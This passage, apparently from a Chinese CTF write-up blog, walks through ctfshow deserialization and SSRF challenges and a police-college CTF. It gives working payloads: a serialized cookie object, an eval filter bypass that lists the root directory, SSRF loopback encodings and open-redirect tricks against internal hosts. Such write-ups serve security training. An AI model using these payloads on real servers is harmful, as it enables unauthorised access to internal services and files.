<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>遇上题的区别就是增加了一个条件<code>if($this-&gt;username!==$this-&gt;password)</code>就是username不等于password。写代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'dfgh'</span><span class="token punctuation">;</span>
		<span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行后得到<code>O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A4%3A%22dfgh%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D</code><br>其余与上题一样。</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>南京森林警察学院CTF</title>
    <url>/2023/03/04/%E5%8D%97%E4%BA%AC%E6%A3%AE%E6%9E%97%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2CTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="这是一道比较简单的web题目"><a href="#这是一道比较简单的web题目" class="headerlink" title="这是一道比较简单的web题目"></a>这是一道比较简单的web题目</h2><p><img src="https://img-blog.csdnimg.cn/f5b19dbc39a34b3e9bf5650b3795ae5e.png" alt="1"><br>将三张照片都保存下来，然后拼图。发现第一张反了，将第一张倒置过来拼图然后扫码<br><img src="https://img-blog.csdnimg.cn/755c10249c564270ab3d4f00f01c7b07.png" alt="2"><br>扫过后得到<br><img src="https://img-blog.csdnimg.cn/6938f6a4f37345738d5975c6a384ccc4.png" alt="3"><br>那就访问&#x2F;vbnp.php<br>得到</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//��������</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<strong>t</strong>  ,<strong>r</strong>   ,<strong>n</strong>,  <strong>‘</strong>  ,<strong>“</strong>,  <strong>&#96;</strong>,  <strong>[</strong>,  <strong>]</strong>,  <strong>$</strong>,  *<em>*</em>,  <strong>^</strong>过滤了</p>
<blockquote>
<p>var_dump() 函数用于输出变量的相关信息。<br>var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>Scandir()：列出 参数目录 中的文件和目录</p>
</blockquote>
<p>**加载?num&#x3D;var_dump(scandir(chr(47)))**也就是var_dump(“&#x2F;“)，就可以得到flag。</p>
<h2 id="黑心的网站"><a href="#黑心的网站" class="headerlink" title="黑心的网站"></a>黑心的网站</h2><p><img src="https://img-blog.csdnimg.cn/53061123fbfa4e4983c58136f462d8f0.png" alt="1"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/3e31a950eef94314959c25f74b06896c.png" alt="25"><br>dirsearch扫一下得到备份文件<br><img src="https://img-blog.csdnimg.cn/5c19ee13d99a4795b1a6fbc952613dec.png" alt="3"><br>内容为：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//error_reporting(0);</span>

<span class="token comment">//设置靶机所在路径</span>
<span class="token variable">$site_root</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/NFPC"</span><span class="token punctuation">;</span>

<span class="token comment">//设置上传目录</span>
<span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../upload/"</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/f6421facbd144e92b789f7a2415345d8.png" alt="5"><br>找到<br><img src="https://img-blog.csdnimg.cn/af5a997fc70e43bf804179d0905dd5bc.png" alt="6"><br>发现xss漏洞<br><img src="https://img-blog.csdnimg.cn/476ec9c4fb6d4fd6977334c8f528999e.png" alt="7"><br>发现script被过滤，<br><img src="https://img-blog.csdnimg.cn/d5a6de988010492882ada878665ac939.png" alt="2"><strong>&lt;&gt;<strong>被转义，那就闭合<br><img src="https://img-blog.csdnimg.cn/6e25dae7e7734c799d07bd78fc542e68.png" alt="6"><br>成功！！！</strong>WAxiangxiangzuichaofan&#x2F;flag</strong><br>得到一个文件，看到文件尾有特征，用foremost分离文件，<br><img src="https://img-blog.csdnimg.cn/6d40bf494d20431aa41b44c8025e13df.png" alt="9">    </p>
<blockquote>
<pre><code>-V-显示版权信息并退出
-t-指定文件类型。（-t jpeg，pdf…）
-d-启用间接块检测（对于UNIX文件系统）
-i-指定输入文件（默认为stdin）
-a-写入所有标头，不执行错误检测（损坏的文件）
-w-仅写入审核文件，不将任何检测到的文件写入磁盘
-o-设置输出目录（默认为输出）
-c-设置要使用的配置文件（默认为forest.conf）
-q-启用快速模式。在512字节边界上执行搜索。
-Q-启用静音模式。抑制输出消息。
-v-冗余模式。将所有消息记录到屏幕。
</code></pre>
</blockquote>
<p>得到分离的文件，有flag。<br><img src="https://img-blog.csdnimg.cn/09154bd7f7ab4779b08279e726f80343.png" alt="12"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-SSRF</title>
    <url>/2023/03/02/ctfshow-SSRF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>当<strong>127.0.0.1</strong>被过滤时，可以使用<strong>127.1</strong> <strong>0</strong> <strong>0.0.0.0</strong>  <strong>sudo.cc</strong> <strong>017700000001</strong> <strong>2130706433</strong> 等等。如果某些字符串被过滤了，尝试对字符串进行两次url编码。</p>
<h3 id="SSRF具有基于白名单的输入过滤器"><a href="#SSRF具有基于白名单的输入过滤器" class="headerlink" title="SSRF具有基于白名单的输入过滤器"></a>SSRF具有基于白名单的输入过滤器</h3><p>某些应用程序只允许与允许值的白名单匹配、以其开头或包含其的输入。在这种情况下，有时可以利用URL解析中的不一致性来绕过过滤器。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">URL</span>规范包含许多在实现对<span class="token constant">URL</span>的即席解析和验证时容易被忽略的特性：

<span class="token number">1</span>、可以使用@字符在主机名之前的 <span class="token constant">URL</span> 中嵌入凭据。 例如：
    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>预期主机<span class="token punctuation">)</span>@evil<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>恶意主机<span class="token punctuation">)</span>

<span class="token number">2</span>、可以使用 # 字符来表示 <span class="token constant">URL</span> 片段。例如：
    https：<span class="token comment">//evil-host(恶意主机)#expected-host(预期主机)</span>

<span class="token number">3</span>、可以利用<span class="token constant">DNS</span>命名层次结构将所需的输入放入您控制的完全限定<span class="token constant">DNS</span>名称中。例如：
    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span>host<span class="token punctuation">.</span>evil<span class="token operator">-</span>host

<span class="token number">4</span>、可以对字符进行<span class="token constant">URL</span>编码以混淆<span class="token constant">URL</span>分析代码。如果实现筛选器的代码与执行后端<span class="token constant">HTTP</span>请求的代码处理<span class="token constant">URL</span>编码的字符的方式不同，则这一点特别有用

<span class="token number">5</span>、可以将这些技术结合使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="通过开放重定向绕过-SSRF-过滤器"><a href="#通过开放重定向绕过-SSRF-过滤器" class="headerlink" title="通过开放重定向绕过 SSRF 过滤器"></a>通过开放重定向绕过 SSRF 过滤器</h3><p>有时可以通过利用开放重定向漏洞来规避任何类型的基于过滤器的防御。</p>
<p>在前面的 SSRF 示例中，假设用户提交的 URL 被严格验证以防止恶意利用 SSRF 行为。但是，允许使用 URL 的应用程序存在开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，您可以构建一个满足过滤器的 URL，并将请求重定向到所需的后端目标。</p>
<p>例如，假设应用程序包含一个开放重定向漏洞，其中包含以下 URL：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回重定向到：</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以利用开放重定向漏洞绕过URL过滤，利用SSRF漏洞，方法如下：</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 118 stockApi&#x3D;http:&#x2F;&#x2F;weliketoshop.net&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;192.168.0.68&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此 SSRF 漏洞利用之所以有效，是因为应用程序首先验证提供的<code>stockAPI</code>URL 是否位于允许的域中，而事实确实如此。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>
<h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p><strong>352</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>353</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://www.php.net/manual/zh/function.parse-url.php"><strong>parse_url</strong> </a></p>
<blockquote>
<p>parse_url — 解析 URL，返回其组成部分</p>
</blockquote>
<blockquote>
<p>curl_setopt — 设置一个cURL传输选项</p>
<p>ch</p>
<p>由 curl_init() 返回的 cURL 句柄。</p>
<p>option</p>
<p>需要设置的CURLOPT_XXX选项。</p>
<p>value</p>
<p>将设置在option选项上的值。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">//初始化一个cURL会话</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//设定请求的RUL</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//设定返回信息中包含响应信息头</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 	启用时会将头文件的信息作为数据流输出。 </span>
<span class="token comment">//参数为1表示输出信息头,为0表示不输出</span>



<span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//TRUE 将curl_exec()获取的信息以字符串返回，而不是直接输出。 </span>
<span class="token comment">//参数为1表示$html,为0表示echo $html</span>





<span class="token comment">//执行一个cURL会话</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//关闭一个surl会话</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span>
<span class="token comment">//echo $html;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>127.1会被解析成127.0.0.1，也就意味着为零可缺省
在Linux中，0也会被解析成127.0.0.1
127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
ip地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/168e616aefc948da8c4c5279035d9f78.png" alt="1"></p>
<blockquote>
<p>十进制整数：url&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>十六进制：url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制：url&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>十六进制整数：url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 缺省模式：127.0.0.1写成127.1<br>CIDR：url&#x3D;<a href="http://127.127.127.127/flag.php%E5%92%8C">http://127.127.127.127/flag.php和</a> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
</blockquote>
<h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>使用<strong><a href="http://sudo.cc/">http://sudo.cc</a></strong>这个域名是指向127.0.0.1的。<br>payload：<code>url=http://sudo.cc/flag.php</code></p>
<h2 id="355"><a href="#355" class="headerlink" title="355"></a>355</h2><p>payload:<code>url=http://0/flag.php</code></p>
<h2 id="356"><a href="#356" class="headerlink" title="356"></a>356</h2><p>payload:<code>url=http://0/flag.php</code></p>
<h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
